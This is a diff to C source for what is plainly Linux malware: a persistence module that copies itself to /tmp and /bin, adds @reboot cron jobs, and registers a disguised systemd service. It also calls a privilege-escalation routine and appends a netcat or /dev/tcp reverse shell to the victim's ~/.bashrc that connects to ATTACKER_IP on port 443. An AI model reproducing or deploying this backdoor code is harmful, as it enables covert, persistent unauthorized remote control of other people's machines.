@@ -1,15 +1,11 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
+#include "persistency.h"
 
-bool make_persistent(char *executable_name);
-
-bool is_first_exec(char *executable_name);
-
-bool priv_esc();
-
-void copy_to_persistent_path(char *current_path, char *dest_path);
-
+#define ATTACKER_SSH_PUBLIC_KEY ""
+#define ATTACKER_IP ""
+#define PORT 443
 
 bool make_persistent(char *executable_name){
     bool isPersistent = false;
@@ -22,44 +18,41 @@ bool make_persistent(char *executable_name){
 
     copy_to_persistent_path(fullpath, "/tmp");
 
-    // add new ssh key to authorized_keys
+    // missing: add new ssh key to authorized_keys
 
-    char *public_key = ATTACKER_SSH_PUBLIC_KEY;
+    //char public_key[] = ATTACKER_SSH_PUBLIC_KEY;
 
-    if(!isRoot){
-        if(priv_esc()){
+    // set cronjob on system reboot
+    char cronjob[128];
+    snprintf(cronjob, sizeof(cronjob), "{ crontab -l; echo \"@reboot /tmp/%s\"; } | crontab -", executable_name);
 
-        }else{
+    system(cronjob);
 
-            // set cronjob on system reboot
-            char cronjob[128];
-            snprintf(cronjob, sizeof(cronjob), "{ crontab -l; echo \"@reboot /tmp/%s\"; } | crontab -", executable_name);
+    // everytime the exploited user make a command in the shell this will try to connect
+    char backdoor_bashrc[128];
 
-            system(cronjob);
+    snprintf(backdoor_bashrc, sizeof(backdoor_bashrc), 
+    "echo \"nc -e /bin/bash %s %i || bash -i >& /dev/tcp/%s/%i 0>&1\" >> ~/.bashrc", ATTACKER_IP, PORT, ATTACKER_IP, PORT);
 
-            // everytime the exploited user make a command in the shell this will try to connect
-            char backdoor_bashrc[128];
+    if(!system(backdoor_bashrc)){
+        isPersistent = true;
+    }
 
-            snprintf(backdoor_bashrc, sizeof(backdoor_bashrc), 
-            "echo \"nc -e /bin/bash %s %i || bash -i >& /dev/tcp/%s/%i 0>&1\" >> ~/.bashrc", ATTACKER_IP, PORT, ATTACKER_IP, PORT);
+    if(priv_esc()){
+        isRoot = true;
+    }
 
-            if(!system(backdoor_bashrc)){
-                isPersistent = true;
-            }
-        }
-
-    }else{
+    if(isRoot){
 
         copy_to_persistent_path(fullpath, "/bin");
 
-        char cronjob[128];
         snprintf(cronjob, sizeof(cronjob), "{ crontab -l; echo \"@reboot /bin/%s\"; } | crontab -", executable_name);
 
         system(cronjob);
 
         char service_config[400] = "sudo echo -e \""
         "[Unit]\n"
-        "Description=Friendly Service\n"
+        "Description=Obviously not malicious service\n"
         "[Service]\n"
         "Type=simple\n"
         "ExecStart=/tmp/%s || /bin/%s\n"
@@ -73,10 +66,8 @@ bool make_persistent(char *executable_name){
 
         snprintf(create_service, sizeof(create_service), service_config, executable_name, executable_name);
 
-        system(create_service);
-
-        system("sudo systemctl enable friendly");
-
+        if(system(create_service) && system("sudo systemctl enable friendly"))
+            isPersistent = true;
     }
     
     return isPersistent;
@@ -98,10 +89,10 @@ bool is_first_exec(char *executable_name){
 
 	snprintf(path, sizeof(path), "/tmp/%s", executable_name);
 
-	if(!access(path, F_OK)){
-        return false;
-    }else{
+	if(access(path, F_OK)){
         return true;
+    }else{
+        return false;
     }
 }
 
